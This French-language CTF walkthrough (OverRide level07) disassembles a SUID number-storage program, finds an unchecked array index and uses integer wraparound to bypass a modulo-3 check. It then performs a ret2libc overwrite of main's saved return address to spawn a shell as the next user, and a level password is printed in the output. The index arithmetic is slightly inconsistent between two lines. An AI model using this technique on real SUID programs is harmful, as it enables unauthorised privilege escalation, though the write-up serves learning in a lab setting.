## 1: Analyse

### A: C'est quoi mon binaire?
* Bon vous commencez a comprendre mon workflow maintenant. Regardez les exercices precedents si vous comprenez pas.

```shell
  level06@OverRide:/tmp$ su level07
    Password:
    RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
    Partial RELRO   Canary found      NX disabled   No PIE          No RPATH   No RUNPATH   /home/users/level07/level07

  level07@OverRide:~$ ls -la
    total 21
    dr-xr-x---+ 1 level07 level07    80 Sep 13  2016 .
    dr-x--x--x  1 root    root      260 Oct  2  2016 ..
    -rw-r--r--  1 level07 level07   220 Sep 10  2016 .bash_logout
    lrwxrwxrwx  1 root    root        7 Sep 13  2016 .bash_profile -> .bashrc
    -rw-r--r--  1 level07 level07  3533 Sep 10  2016 .bashrc
    -rwsr-s---+ 1 level08 users   11744 Sep 10  2016 level07
    -rw-r--r--+ 1 level07 level07    41 Oct 19  2016 .pass
    -rw-r--r--  1 level07 level07   675 Sep 10  2016 .profile

  level07@OverRide:~$ ./level07
    ----------------------------------------------------
      Welcome to wil's crappy number storage service!
    ----------------------------------------------------
    Commands:
        store - store a number into the data storage
        read  - read a number from the data storage
        quit  - exit the program
    ----------------------------------------------------
      wil has reserved some storage :>
    ----------------------------------------------------

    Input command: store 42
    Number: 42
    Index: 1
    Completed store 42 command successfully

    Input command: read
    Index: 1
    Number at data[1] is 42
    Completed read command successfully

    Input command: 43
    Failed to do 43 command

    Input command: store
    Number: 43
    Index: 1
    Completed store command successfully

    Input command: read 1
    Index: 1
    Number at data[1] is 43
    Completed read 1 command successfully

    Input command: store qwertyuioasdfghjkl;zxcvbnm,qwertyuiopasdfghjklzxcvbnmwertyuiopasdfghjklzxcvb
    Number:  Index: 3
    *** ERROR! ***
      This index is reserved for wil!
    *** ERROR! ***
    Failed to do store qwertyuioasd command

    Input command: quit

    level07@OverRide:~$
```

  * On a un binaire appartenant a level08 dans le home avec les droits SUID...
  * ... qui demande une commande ...
  * ... store va stocker un nombre a un certain index ...
  * ... read va lire ce nombre ...
  * ... quit va quitter le programme ...
  * ... pas de segfault évident ...
  * ... utilisation de fread évidente puisqu'avec un input long, les prochains inputs sont remplis.

### B: On l'ouvre avec gdb

* Pareil pour ici regardez les exos precedents si vous comprenez pas ce que je fais

```shell
  level07@OverRide:/tmp$ gdb ~/level07
    GNU gdb (Ubuntu/Linaro 7.4-2012.04-0ubuntu2.1) 7.4-2012.04
    Copyright (C) 2012 Free Software Foundation, Inc.
    License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
    This is free software: you are free to change and redistribute it.
    There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
    and "show warranty" for details.
    This GDB was configured as "x86_64-linux-gnu".
    For bug reporting instructions, please see:
    <http://bugs.launchpad.net/gdb-linaro/>...
    Reading symbols from /home/users/level07/level07...(no debugging symbols found)...done.

  gdb-peda$ info functions
    All defined functions:

    Non-debugging symbols:
    0x0804842c  _init
    0x08048470  printf
    0x08048470  printf@plt
    0x08048480  fflush
    0x08048480  fflush@plt
    0x08048490  getchar
    0x08048490  getchar@plt
    0x080484a0  fgets
    0x080484a0  fgets@plt
    0x080484b0  __stack_chk_fail
    0x080484b0  __stack_chk_fail@plt
    0x080484c0  puts
    0x080484c0  puts@plt
    0x080484d0  __gmon_start__
    0x080484d0  __gmon_start__@plt
    0x080484e0  __libc_start_main
    0x080484e0  __libc_start_main@plt
    0x080484f0  memset
    0x080484f0  memset@plt
    0x08048500  __isoc99_scanf
    0x08048500  __isoc99_scanf@plt
    0x08048510  _start
    0x08048540  __do_global_dtors_aux
    0x080485a0  frame_dummy
    0x080485c4  clear_stdin
    0x080485e7  get_unum
    0x0804861f  prog_timeout
    0x08048630  store_number
    0x080486d7  read_number
    0x08048723  main
    0x08048a00  __libc_csu_init
    0x08048a70  __libc_csu_fini
    0x08048a72  __i686.get_pc_thunk.bx
    0x08048a80  __do_global_ctors_aux
    0x08048aac  _fini

  gdb-peda$ pdisas main
    Dump of assembler code for function main:
    # Initialisation, sauvegarde registres, allocation de 465 octets !
    0x08048723 <+0>:	push   ebp
    0x08048724 <+1>:	mov    ebp,esp
    0x08048726 <+3>:	push   edi
    0x08048727 <+4>:	push   esi
    0x08048728 <+5>:	push   ebx
    0x08048729 <+6>:	and    esp,0xfffffff0
    0x0804872c <+9>:	sub    esp,0x1d0

    # argv_ptr (esp+0x1c) = argv[0]
    0x08048732 <+15>:	mov    eax,DWORD PTR [ebp+0xc]
    0x08048735 <+18>:	mov    DWORD PTR [esp+0x1c],eax

    # argv_1 (esp+0x18) = argv[1]
    0x08048739 <+22>:	mov    eax,DWORD PTR [ebp+0x10]
    0x0804873c <+25>:	mov    DWORD PTR [esp+0x18],eax

    # beginning_canary (esp+0x11c) = canary
    0x08048740 <+29>:	mov    eax,gs:0x14
    0x08048746 <+35>:	mov    DWORD PTR [esp+0x1cc],eax

    # eax = 0
    0x0804874d <+42>:	xor    eax,eax

    # bzero(esp+0x1b4, 24)
    0x0804874f <+44>:	mov    DWORD PTR [esp+0x1b4],0x0
    0x0804875a <+55>:	mov    DWORD PTR [esp+0x1b8],0x0
    0x08048765 <+66>:	mov    DWORD PTR [esp+0x1bc],0x0
    0x08048770 <+77>:	mov    DWORD PTR [esp+0x1c0],0x0
    0x0804877b <+88>:	mov    DWORD PTR [esp+0x1c4],0x0
    0x08048786 <+99>:	mov    DWORD PTR [esp+0x1c8],0x0

    # memset(array[100], 0 ,100)
    0x08048791 <+110>:	lea    ebx,[esp+0x24]
    0x08048795 <+114>:	mov    eax,0x0
    0x0804879a <+119>:	mov    edx,0x64
    0x0804879f <+124>:	mov    edi,ebx
    0x080487a1 <+126>:	mov    ecx,edx
    0x080487a3 <+128>:	rep stos DWORD PTR es:[edi],eax

    # While *argv_ptr != 0 (condition main +199)...
    0x080487a5 <+130>:	jmp    0x80487ea <main+199>

    # ... memset(argv_ptr, 0, strlen(argv_ptr))
    0x080487a7 <+132>:	mov    eax,DWORD PTR [esp+0x1c]
    0x080487ab <+136>:	mov    eax,DWORD PTR [eax]
    0x080487ad <+138>:	mov    DWORD PTR [esp+0x14],0xffffffff
    0x080487b5 <+146>:	mov    edx,eax
    0x080487b7 <+148>:	mov    eax,0x0
    0x080487bc <+153>:	mov    ecx,DWORD PTR [esp+0x14]
    0x080487c0 <+157>:	mov    edi,edx
    0x080487c2 <+159>:	repnz scas al,BYTE PTR es:[edi]
    0x080487c4 <+161>:	mov    eax,ecx
    0x080487c6 <+163>:	not    eax
    0x080487c8 <+165>:	lea    edx,[eax-0x1]
    0x080487cb <+168>:	mov    eax,DWORD PTR [esp+0x1c]
    0x080487cf <+172>:	mov    eax,DWORD PTR [eax]
    0x080487d1 <+174>:	mov    DWORD PTR [esp+0x8],edx
    0x080487d5 <+178>:	mov    DWORD PTR [esp+0x4],0x0
    0x080487dd <+186>:	mov    DWORD PTR [esp],eax
    0x080487e0 <+189>:	call   0x80484f0 <memset@plt>

    # ... argv_ptr++
    0x080487e5 <+194>:	add    DWORD PTR [esp+0x1c],0x4

    # ... if *argv_ptr != 0 jump main+132 (condition du while)
    0x080487ea <+199>:	mov    eax,DWORD PTR [esp+0x1c]
    0x080487ee <+203>:	mov    eax,DWORD PTR [eax]
    0x080487f0 <+205>:	test   eax,eax
    0x080487f2 <+207>:	jne    0x80487a7 <main+132>

    # While argv_1 != 0 (condition main +278)...
    0x080487f4 <+209>:	jmp    0x8048839 <main+278>

    # ... memset(argv_1, 0, strlen(argv_1)
    0x080487f6 <+211>:	mov    eax,DWORD PTR [esp+0x18]
    0x080487fa <+215>:	mov    eax,DWORD PTR [eax]
    0x080487fc <+217>:	mov    DWORD PTR [esp+0x14],0xffffffff
    0x08048804 <+225>:	mov    edx,eax
    0x08048806 <+227>:	mov    eax,0x0
    0x0804880b <+232>:	mov    ecx,DWORD PTR [esp+0x14]
    0x0804880f <+236>:	mov    edi,edx
    0x08048811 <+238>:	repnz scas al,BYTE PTR es:[edi]
    0x08048813 <+240>:	mov    eax,ecx
    0x08048815 <+242>:	not    eax
    0x08048817 <+244>:	lea    edx,[eax-0x1]
    0x0804881a <+247>:	mov    eax,DWORD PTR [esp+0x18]
    0x0804881e <+251>:	mov    eax,DWORD PTR [eax]
    0x08048820 <+253>:	mov    DWORD PTR [esp+0x8],edx
    0x08048824 <+257>:	mov    DWORD PTR [esp+0x4],0x0
    0x0804882c <+265>:	mov    DWORD PTR [esp],eax
    0x0804882f <+268>:	call   0x80484f0 <memset@plt>

    # ... argv_1++
    0x08048834 <+273>:	add    DWORD PTR [esp+0x18],0x4

    # ... if argv_1 != 0 jump main+211 (condition du while)
    0x08048839 <+278>:	mov    eax,DWORD PTR [esp+0x18]
    0x0804883d <+282>:	mov    eax,DWORD PTR [eax]
    0x0804883f <+284>:	test   eax,eax
    0x08048841 <+286>:	jne    0x80487f6 <main+211>

    # Bon la il print l'input initial.
    0x08048843 <+288>:	mov    DWORD PTR [esp],0x8048b38
    0x0804884a <+295>:	call   0x80484c0 <puts@plt>

    # Ici c'est le debut de notre boucle infinie, printf("Input command")
    0x0804884f <+300>:	mov    eax,0x8048d4b
    0x08048854 <+305>:	mov    DWORD PTR [esp],eax
    0x08048857 <+308>:	call   0x8048470 <printf@plt>

    # fgets(command[20], 20, stdin)
    # command - 1 = 1 
    0x0804885c <+313>:	mov    DWORD PTR [esp+0x1b4],0x1
    0x08048867 <+324>:	mov    eax,ds:0x804a040
    0x0804886c <+329>:	mov    DWORD PTR [esp+0x8],eax
    0x08048870 <+333>:	mov    DWORD PTR [esp+0x4],0x14
    0x08048878 <+341>:	lea    eax,[esp+0x1b8]
    0x0804887f <+348>:	mov    DWORD PTR [esp],eax
    0x08048882 <+351>:	call   0x80484a0 <fgets@plt>

    # command[strlen(command)] = '\0'
    0x08048887 <+356>:	lea    eax,[esp+0x1b8]
    0x0804888e <+363>:	mov    DWORD PTR [esp+0x14],0xffffffff
    0x08048896 <+371>:	mov    edx,eax
    0x08048898 <+373>:	mov    eax,0x0
    0x0804889d <+378>:	mov    ecx,DWORD PTR [esp+0x14]
    0x080488a1 <+382>:	mov    edi,edx
    0x080488a3 <+384>:	repnz scas al,BYTE PTR es:[edi]
    0x080488a5 <+386>:	mov    eax,ecx
    0x080488a7 <+388>:	not    eax
    0x080488a9 <+390>:	sub    eax,0x1
    0x080488ac <+393>:	sub    eax,0x1
    0x080488af <+396>:	mov    BYTE PTR [esp+eax*1+0x1b8],0x0

    # if strncmp(command, "store", 5)
    0x080488b7 <+404>:	lea    eax,[esp+0x1b8]
    0x080488be <+411>:	mov    edx,eax
    0x080488c0 <+413>:	mov    eax,0x8048d5b
    0x080488c5 <+418>:	mov    ecx,0x5
    0x080488ca <+423>:	mov    esi,edx
    0x080488cc <+425>:	mov    edi,eax
    0x080488ce <+427>:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
    0x080488d0 <+429>:	seta   dl
    0x080488d3 <+432>:	setb   al
    0x080488d6 <+435>:	mov    ecx,edx
    0x080488d8 <+437>:	sub    cl,al
    0x080488da <+439>:	mov    eax,ecx
    0x080488dc <+441>:	movsx  eax,al
    0x080488df <+444>:	test   eax,eax
    0x080488e1 <+446>:	jne    0x80488f8 <main+469>

    # ... command-1 = store_number(array) 
    0x080488e3 <+448>:	lea    eax,[esp+0x24]
    0x080488e7 <+452>:	mov    DWORD PTR [esp],eax
    0x080488ea <+455>:	call   0x8048630 <store_number>
    0x080488ef <+460>:	mov    DWORD PTR [esp+0x1b4],eax
    0x080488f6 <+467>:	jmp    0x8048965 <main+578>

    # else if strncmp(command, "read", 4)
    0x080488f8 <+469>:	lea    eax,[esp+0x1b8]
    0x080488ff <+476>:	mov    edx,eax
    0x08048901 <+478>:	mov    eax,0x8048d61
    0x08048906 <+483>:	mov    ecx,0x4
    0x0804890b <+488>:	mov    esi,edx
    0x0804890d <+490>:	mov    edi,eax
    0x0804890f <+492>:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
    0x08048911 <+494>:	seta   dl
    0x08048914 <+497>:	setb   al
    0x08048917 <+500>:	mov    ecx,edx
    0x08048919 <+502>:	sub    cl,al
    0x0804891b <+504>:	mov    eax,ecx
    0x0804891d <+506>:	movsx  eax,al
    0x08048920 <+509>:	test   eax,eax
    0x08048922 <+511>:	jne    0x8048939 <main+534>

    # ... command-1 = read_number(array)
    0x08048924 <+513>:	lea    eax,[esp+0x24]
    0x08048928 <+517>:	mov    DWORD PTR [esp],eax
    0x0804892b <+520>:	call   0x80486d7 <read_number>
    0x08048930 <+525>:	mov    DWORD PTR [esp+0x1b4],eax
    0x08048937 <+532>:	jmp    0x8048965 <main+578>

    # else if strncmp(command, "quit", 4) check stack return 0
    0x08048939 <+534>:	lea    eax,[esp+0x1b8]
    0x08048940 <+541>:	mov    edx,eax
    0x08048942 <+543>:	mov    eax,0x8048d66
    0x08048947 <+548>:	mov    ecx,0x4
    0x0804894c <+553>:	mov    esi,edx
    0x0804894e <+555>:	mov    edi,eax
    0x08048950 <+557>:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
    0x08048952 <+559>:	seta   dl
    0x08048955 <+562>:	setb   al
    0x08048958 <+565>:	mov    ecx,edx
    0x0804895a <+567>:	sub    cl,al
    0x0804895c <+569>:	mov    eax,ecx
    0x0804895e <+571>:	movsx  eax,al
    0x08048961 <+574>:	test   eax,eax
    0x08048963 <+576>:	je     0x80489cf <main+684>

    # if command-1 != 0 
    0x08048965 <+578>:	cmp    DWORD PTR [esp+0x1b4],0x0
    0x0804896d <+586>:	je     0x8048989 <main+614>

    # ... printf(" Failed to do %s command\n", command)
    # ... <main+638> reset command and retour en haut de la boucle
    0x0804896f <+588>:	mov    eax,0x8048d6b
    0x08048974 <+593>:	lea    edx,[esp+0x1b8]
    0x0804897b <+600>:	mov    DWORD PTR [esp+0x4],edx
    0x0804897f <+604>:	mov    DWORD PTR [esp],eax
    0x08048982 <+607>:	call   0x8048470 <printf@plt>
    0x08048987 <+612>:	jmp    0x80489a1 <main+638>

    # else printf(" Completed %s command successfully\n", command)
    0x08048989 <+614>:	mov    eax,0x8048d88
    0x0804898e <+619>:	lea    edx,[esp+0x1b8]
    0x08048995 <+626>:	mov    DWORD PTR [esp+0x4],edx
    0x08048999 <+630>:	mov    DWORD PTR [esp],eax
    0x0804899c <+633>:	call   0x8048470 <printf@plt>

    # reset la command, retour en haut de la boucle
    0x080489a1 <+638>:	lea    eax,[esp+0x1b8]
    0x080489a8 <+645>:	mov    DWORD PTR [eax],0x0
    0x080489ae <+651>:	mov    DWORD PTR [eax+0x4],0x0
    0x080489b5 <+658>:	mov    DWORD PTR [eax+0x8],0x0
    0x080489bc <+665>:	mov    DWORD PTR [eax+0xc],0x0
    0x080489c3 <+672>:	mov    DWORD PTR [eax+0x10],0x0
    0x080489ca <+679>:	jmp    0x804884f <main+300>

    # check stack integrity & return 0
    0x080489cf <+684>:	nop
    0x080489d0 <+685>:	mov    eax,0x0
    0x080489d5 <+690>:	mov    esi,DWORD PTR [esp+0x1cc]
    0x080489dc <+697>:	xor    esi,DWORD PTR gs:0x14
    0x080489e3 <+704>:	je     0x80489ea <main+711>
    0x080489e5 <+706>:	call   0x80484b0 <__stack_chk_fail@plt>
    0x080489ea <+711>:	lea    esp,[ebp-0xc]
    0x080489ed <+714>:	pop    ebx
    0x080489ee <+715>:	pop    esi
    0x080489ef <+716>:	pop    edi
    0x080489f0 <+717>:	pop    ebp
    0x080489f1 <+718>:	ret
    End of assembler dump.
```

* Commandes lancées pendant l'analyse du binaire ci-dessus
```shell
  gdb-peda$ x/s 0x8048b38
    0x8048b38:	 '-' <repeats 52 times>, "\n  Welcome to wil's crappy number storage service!   \n", '-' <repeats 52 times>, "\n Commands:", ' ' <repeats 31 times>...
  gdb-peda$ x/s 0x804a040
    0x804a040 <stdin@@GLIBC_2.0>:	 ""
  gdb-peda$ x/s 0x8048d5b
    0x8048d5b:	 "store"
  gdb-peda$ x/s 0x8048d61
    0x8048d61:	 "read"
  gdb-peda$ x/s 0x8048d66
    0x8048d66:	 "quit"
  gdb-peda$ x/s 0x8048d6b
    0x8048d6b:	 " Failed to do %s command\n"
  gdb-peda$ x/s 0x8048d88
    0x8048d88:	 " Completed %s command successfully\n"
```

* On passe sur store_number
```shell
  gdb-peda$ pdisas store_number
    Dump of assembler code for function store_number:
    # Initialisation, allocation de 40
    0x08048630 <+0>:	push   ebp
    0x08048631 <+1>:	mov    ebp,esp
    0x08048633 <+3>:	sub    esp,0x28

    # number = index = 0
    0x08048636 <+6>:	mov    DWORD PTR [ebp-0x10],0x0
    0x0804863d <+13>:	mov    DWORD PTR [ebp-0xc],0x0

    # printf(" Number: ")
    0x08048644 <+20>:	mov    eax,0x8048ad3
    0x08048649 <+25>:	mov    DWORD PTR [esp],eax
    0x0804864c <+28>:	call   0x8048470 <printf@plt>

    # number = get_unum()
    0x08048651 <+33>:	call   0x80485e7 <get_unum>
    0x08048656 <+38>:	mov    DWORD PTR [ebp-0x10],eax

    # printf(" Index: ")
    0x08048659 <+41>:	mov    eax,0x8048add
    0x0804865e <+46>:	mov    DWORD PTR [esp],eax
    0x08048661 <+49>:	call   0x8048470 <printf@plt>

    # index = get_unum()
    0x08048666 <+54>:	call   0x80485e7 <get_unum>
    0x0804866b <+59>:	mov    DWORD PTR [ebp-0xc],eax

    # if index % 3 != 0 or ...
    0x0804866e <+62>:	mov    ecx,DWORD PTR [ebp-0xc]
    0x08048671 <+65>:	mov    edx,0xaaaaaaab
    0x08048676 <+70>:	mov    eax,ecx
    0x08048678 <+72>:	mul    edx
    0x0804867a <+74>:	shr    edx,1
    0x0804867c <+76>:	mov    eax,edx
    0x0804867e <+78>:	add    eax,eax
    0x08048680 <+80>:	add    eax,edx
    0x08048682 <+82>:	mov    edx,ecx
    0x08048684 <+84>:	sub    edx,eax
    0x08048686 <+86>:	test   edx,edx
    0x08048688 <+88>:	je     0x8048697 <store_number+103>

    # ... number >> 24 == 183
    0x0804868a <+90>:	mov    eax,DWORD PTR [ebp-0x10]
    0x0804868d <+93>:	shr    eax,0x18
    0x08048690 <+96>:	cmp    eax,0xb7
    0x08048695 <+101>:	jne    0x80486c2 <store_number+146>

    # ... puts(" *** ERROR! ***   This index is reserved for wil! *** ERROR! ***")
    0x08048697 <+103>:	mov    DWORD PTR [esp],0x8048ae6
    0x0804869e <+110>:	call   0x80484c0 <puts@plt>
    0x080486a3 <+115>:	mov    DWORD PTR [esp],0x8048af8
    0x080486aa <+122>:	call   0x80484c0 <puts@plt>
    0x080486af <+127>:	mov    DWORD PTR [esp],0x8048ae6
    0x080486b6 <+134>:	call   0x80484c0 <puts@plt>

    # ... return(1)
    0x080486bb <+139>:	mov    eax,0x1
    0x080486c0 <+144>:	jmp    0x80486d5 <store_number+165>

    # array[index] = number return 0
    0x080486c2 <+146>:	mov    eax,DWORD PTR [ebp-0xc]
    0x080486c5 <+149>:	shl    eax,0x2  index * 4
    0x080486c8 <+152>:	add    eax,DWORD PTR [ebp+0x8]
    0x080486cb <+155>:	mov    edx,DWORD PTR [ebp-0x10]
    0x080486ce <+158>:	mov    DWORD PTR [eax],edx
    0x080486d0 <+160>:	mov    eax,0x0

    # return 
    0x080486d5 <+165>:	leave
    0x080486d6 <+166>:	ret
    End of assembler dump.
```

* Commandes lancées pendant l'analyse du binaire ci-dessus
```shell
  gdb-peda$ x/s 0x8048ad3
    0x8048ad3:	 " Number: "
  gdb-peda$ x/s 0x8048add
    0x8048add:	 " Index: "
  gdb-peda$ x/s 0x8048ae6
    0x8048ae6:	 " *** ERROR! ***"
  gdb-peda$ x/s 0x8048af8
    0x8048af8:	 "   This index is reserved for wil!"
  gdb-peda$ x/s 0x8048ae6
    0x8048ae6:	 " *** ERROR! ***"
```

* On passe sur read_number
```shell
gdb-peda$ pdisas read_number
  Dump of assembler code for function read_number:
  # Initialisation, allocation de 40 octets
  0x080486d7 <+0>:	push   ebp
  0x080486d8 <+1>:	mov    ebp,esp
  0x080486da <+3>:	sub    esp,0x28

  # u_int index = 0
  0x080486dd <+6>:	mov    DWORD PTR [ebp-0xc],0x0

  # printf(" Index: ")
  0x080486e4 <+13>:	mov    eax,0x8048add
  0x080486e9 <+18>:	mov    DWORD PTR [esp],eax
  0x080486ec <+21>:	call   0x8048470 <printf@plt>

  # index = get_unum()
  0x080486f1 <+26>:	call   0x80485e7 <get_unum>
  0x080486f6 <+31>:	mov    DWORD PTR [ebp-0xc],eax

  # printf(" Number at data[%u] is %u\n", index, array[index * 4])
  0x080486f9 <+34>:	mov    eax,DWORD PTR [ebp-0xc]
  0x080486fc <+37>:	shl    eax,0x2
  0x080486ff <+40>:	add    eax,DWORD PTR [ebp+0x8]
  0x08048702 <+43>:	mov    edx,DWORD PTR [eax]
  0x08048704 <+45>:	mov    eax,0x8048b1b
  0x08048709 <+50>:	mov    DWORD PTR [esp+0x8],edx
  0x0804870d <+54>:	mov    edx,DWORD PTR [ebp-0xc]
  0x08048710 <+57>:	mov    DWORD PTR [esp+0x4],edx
  0x08048714 <+61>:	mov    DWORD PTR [esp],eax
  0x08048717 <+64>:	call   0x8048470 <printf@plt>

  # return 0
  0x0804871c <+69>:	mov    eax,0x0
  0x08048721 <+74>:	leave
  0x08048722 <+75>:	ret
  End of assembler dump.
```

* Commandes lancées pendant l'analyse du binaire ci-dessus
```shell
  gdb-peda$ x/s 0x8048add
    0x8048add:	 " Index: "
  gdb-peda$ x/s 0x8048b1b
    0x8048b1b:	 " Number at data[%u] is %u\n"
```

* On passe sur get_unum
```shell
gdb-peda$ pdisas get_unum
  Dump of assembler code for function get_unum:
  # Initialisation, allocation de 40 octets
  0x080485e7 <+0>:	push   ebp
  0x080485e8 <+1>:	mov    ebp,esp
  0x080485ea <+3>:	sub    esp,0x28

  # number = 0
  0x080485ed <+6>:	mov    DWORD PTR [ebp-0xc],0x0

  # fflush(stdout)
  0x080485f4 <+13>:	mov    eax,ds:0x804a060
  0x080485f9 <+18>:	mov    DWORD PTR [esp],eax
  0x080485fc <+21>:	call   0x8048480 <fflush@plt>

  # scanf("%u", &number)
  0x08048601 <+26>:	mov    eax,0x8048ad0
  0x08048606 <+31>:	lea    edx,[ebp-0xc]
  0x08048609 <+34>:	mov    DWORD PTR [esp+0x4],edx
  0x0804860d <+38>:	mov    DWORD PTR [esp],eax
  0x08048610 <+41>:	call   0x8048500 <__isoc99_scanf@plt>
  0x08048615 <+46>:	call   0x80485c4 <clear_stdin>

  # return number
  0x0804861a <+51>:	mov    eax,DWORD PTR [ebp-0xc]
  0x0804861d <+54>:	leave
  0x0804861e <+55>:	ret
  End of assembler dump.
```

* Commandes lancées pendant l'analyse du binaire ci-dessus
```shell
  gdb-peda$ x/s 0x804a060
    0x804a060 <stdout@@GLIBC_2.0>:	 ""
```

* On passe sur clear_stdin
```shell
gdb-peda$ pdisas clear_stdin
  Dump of assembler code for function clear_stdin:
  # Initialisation, allocation de 24 octets
  0x080485c4 <+0>:	push   ebp
  0x080485c5 <+1>:	mov    ebp,esp
  0x080485c7 <+3>:	sub    esp,0x18

  # char c = 0
  0x080485ca <+6>:	mov    BYTE PTR [ebp-0x9],0x0

  # While getchar() != EOF... condition <+27>
  0x080485ce <+10>:	jmp    0x80485d1 <clear_stdin+13>
  0x080485d0 <+12>:	nop
  0x080485d1 <+13>:	call   0x8048490 <getchar@plt>
  0x080485d6 <+18>:	mov    BYTE PTR [ebp-0x9],al

  #... If c == "\n" return
  0x080485d9 <+21>:	cmp    BYTE PTR [ebp-0x9],0xa
  0x080485dd <+25>:	je     0x80485e5 <clear_stdin+33>

  # ... if c != EOF while condition
  0x080485df <+27>:	cmp    BYTE PTR [ebp-0x9],0xff
  0x080485e3 <+31>:	jne    0x80485d0 <clear_stdin+12>

  # return
  0x080485e5 <+33>:	leave
  0x080485e6 <+34>:	ret
  End of assembler dump.
```

## 2: Comportement

* Ok, donc on a un programme qui demande une commande ...
* ... stock va demander un nombre et un index et le stocker si index % 3 && index >> 24 != 183 ...
* ... read va demander un index et print le nombre stocké à cet index
* ... quit va quitter le programme ...
* ... une autre commande va print une erreur ...

## 3: Exploit

### A: Explication

> Ici, on voit qu'on peut faire un overflow puisque les index ne sont pas protégés...\
> On va donc essayer de "stock" un retour a la libc dans l'EIP du main.\
> L'index serait donc de (&EIP - &array) / 4.\
> On va se rendre compte que ce résultat est divisible par 3, c'est donc un index interdit.\
> On va donc chercher à utiliser l'indexage circulaire de la stack.\
> L'indexage circulaire, ca veut dire que au dessus de 0xffffffff, on va retourner à 0.\
> Si nous faisons &array + 0xffffffff / 4, on va donc retomber sur notre array.\
> (Le / 4 ci-dessus correspond au fait qu'on est dans un tableau d'int)\
> On va donc ajouter notre index initial à 0xffffffff / 4 et se rendre compte que ce n'est pas divisible par 3.\
> On pourra ainsi réécrire sur l'EIP du main pour rediriger sur system.\
> Il faudra comme dans un exercice précédent écrire "/bin/sh" dans argv[0] puisque le programme le met a 0 au début.\
> ACTION!

### B: Creation de l'exploit

* Il nous faut donc:
- l'addresse de system: 0xf7e6aed0
- l'addresse de "/bin/sh": 0xf7f897ec
- l'addresse de la sauvegarde de l'EIP: 0xffffd2cc
- l'addresse de array: 0xffffd104 ou 0xffffd104 + 0xffffffff + 1(voir ci-dessous)
- un petit calcul
- stocker &system à l'index calculé
- quit et le tour est joué!

```shell
# On repasse avec gdb normal, j'arrive pas avec peda a faire fonctionner find:
# On trouve /bin/sh
(gdb) find __libc_start_main,+99999999,"/bin/sh"
  0xf7f897ec[...]

# Oh il faut run pour l'avoir
gdb-peda$ p system
  No symbol table is loaded.  Use the "file" command.

# Ce breakpoint va nous servir pour plusieurs choses:...
gdb-peda$ b * main+718
  Breakpoint 1 at 0x80489f1

gdb-peda$ run
  ----------------------------------------------------
    Welcome to wils crappy number storage service!
  ----------------------------------------------------
  Commands:
      store - store a number into the data storage
      read  - read a number from the data storage
      quit  - exit the program
  ----------------------------------------------------
    wil has reserved some storage :>
  ----------------------------------------------------

  Input command: quit
  [----------------------------------registers-----------------------------------]
  [...]
  # ... L'addresse de la sauvegarde de l'EIP,
  ESP: 0xffffd2cc --> 0xf7e45513 (<__libc_start_main+243>:)
  [...]
  [-------------------------------------code-------------------------------------]
  [...]
  => 0x80489f1 <main+718>:	ret
  [...]
  Breakpoint 1, 0x080489f1 in main ()

# ... L'addresse de system
gdb-peda$ p system
  $1 = {<text variable, no debug info>} 0xf7e6aed0 <system>

# On change de breakpoint pour aller chercher la suite
gdb-peda$ b * main+638
  Breakpoint 2 at 0x80489a1

# On met un 1 a l'index 1 pour chercher array
gdb-peda$ run
  [...]
  Input command: store
  Number: 1
  Index: 1
  [...]
  Breakpoint 2, 0x080489a1 in main ()
  [...]

# On l'a!
gdb-peda$ x/12d $esp+0x24
  0xffffd104:	0	1	0	0
  0xffffd114:	0	0	0	0
  0xffffd124:	0	0	0	0

# Ah! il faut rajouter 1 on ne tombe pas vraiment sur array:
gdb-peda$ p $esp+0x24+0xffffffff
  $4 = (void *) 0xffffd103

# Le piti calcul:
# On prend déjà l'offset (&eip-array):
gdb-peda$ p 0xffffd2cc - 0xffffd104
  $5 = 0x1c8
# 456, or 456/4 = 114 et 114 % 3 == 0 c'est pour ca qu'on s'embête avec le 0xffffffff + 1
```

* DONC notre index est 0xffffffff / 4 + 114 + 1  = 1 073 741 938
* et pour la string:   116 oui c'est divisible par 3

* On va donc stocker les valeurs suivantes:
* array[1073741937] = &system    = 0xf7e6aed0 = 4 159 090 384
* array[116]        = "/bin/sh"  = 0xf7f897ec = 4 160 264 172

```shell
level07@OverRide:/tmp$ ~/level07
  ----------------------------------------------------
    Welcome to wils crappy number storage service!
  ----------------------------------------------------
  Commands:
      store - store a number into the data storage
      read  - read a number from the data storage
      quit  - exit the program
  ----------------------------------------------------
    wil has reserved some storage :>
  ----------------------------------------------------

  Input command: store
  Number: 4159090384
  Index: 1073741938
  Completed store command successfully
  Input command: store
  Number: 4159090384
  Index: 1
  Completed store command successfully
  Input command: store
  Number: 4160264172
  Index: 116
  Completed store command successfully
  Input command: quit
$ whoami
  level08
$ cat /home/users/level08/.pass
  7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
$
  Segmentation fault (core dumped)
level07@OverRide:/tmp$ su level08
  Password:
  RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
  Full RELRO      Canary found      NX disabled   No PIE          No RPATH   No RUNPATH   /home/users/level08/level08
level08@OverRide:~$

```